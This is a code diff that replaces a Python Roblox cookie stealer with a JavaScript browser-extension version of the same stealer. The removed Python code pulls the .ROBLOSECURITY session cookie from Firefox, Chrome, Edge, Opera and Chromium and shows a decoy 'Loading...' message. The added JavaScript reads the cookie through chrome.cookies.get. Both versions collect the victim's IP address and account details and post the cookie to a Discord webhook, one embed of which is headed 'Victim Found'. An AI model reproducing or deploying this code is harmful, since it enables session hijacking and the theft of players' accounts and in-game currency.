@@ -1,139 +1,65 @@
-import os
-import codecs
-import marshal, zlib, base64, lzma
-import json
-from base64 import *
+const WEBHOOK = "https://discord.com/api/webhooks/1064089251337216030/3l-sAomlhSySxjilbt0aVn-TT_WsmtcNcLvoqJU1XH7SaFKKxBrkeWAhNZ_-O6h98Lw3";
 
-webhook = "https://cuty.io/wpURvY"
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
 
-def command(c):
-    os.system(c)
-def cls():
-    os.system("cls")
-
-try:
-    import robloxpy
-    import requests,re
-    from discordwebhook import *
-    import browser_cookie3
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
     
-except:
-    input("Libraries not installed press enter to exit...")
-
-
-
-
-dummy_message = "Loading..." # A message that distracts the user from closing the grabber
-print(dummy_message)
-################### Gathering INFOMATION #################################
-def cookieLogger():
-
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-
-cookies = cookieLogger()
-
-
-#################### INFOMATION #################
-ip_address = requests.get("https://api.ipify.org/").text
-roblox_cookie = cookies[1]
-#################### checking cookie #############
-isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
-if isvalid == "Valid Cookie":
-    pass
-else:
-    requests.post(url=webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
-    exit()
-
-#################### getting info about the cookie #############
-ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
-info = json.loads(ebruh.text)
-rid = info["UserID"]
-rap = robloxpy.User.External.GetRAP(rid)
-friends = robloxpy.User.Friends.External.GetCount(rid)
-age = robloxpy.User.External.GetAge(rid)
-crdate = robloxpy.User.External.CreationDate(rid)
-rolimons = f"https://www.rolimons.com/player/{rid}"
-roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
-headshot = robloxpy.User.External.GetHeadshot(rid)
-username = info['UserName']
-robux = info['RobuxBalance']
-premium = info['IsPremium']
-#################### SENDING TO WEBHOOK #################
-
-discord = Discord(url=webhook)
-discord.post(
-    username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
-    embeds=[
-        {
-            "username": "STEAL BOT",
-            "title": "OOOOH NO ANOTHER ACCOUNT 🕯",
-            "description" : f"[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-            "color" : 12452044,
-            "fields": [
-                {"name": "Username", "value": username, "inline": True},
-                {"name": "Robux Balance", "value": robux, "inline": True},
-                {"name": "Premium Status", "value": premium,"inline": True},
-                {"name": "Creation Date", "value": crdate, "inline": True},
-                {"name" : "RAP", "value": rap,"inline": True},
-                {"name" : "Friends", "value": friends, "inline": True},
-                {"name" : "Account Age", "value": age, "inline": True},
-                {"name" : "IP Address", "value" : ip_address, "inline:": True},
-                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": null,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                  {
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
+                  "name": "Victim Found: " + ipAddr,
+                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                  "text": "https://github.com/ox-y",
+                  "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
+                },
+                "thumbnail": {
+                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+              }
             ],
-            "thumbnail": {"url": headshot},
+            "username": "Roblox",
+            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
+            "attachments": []
+        })
+    });
+}
 
-
-        }
-    ],
-)
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
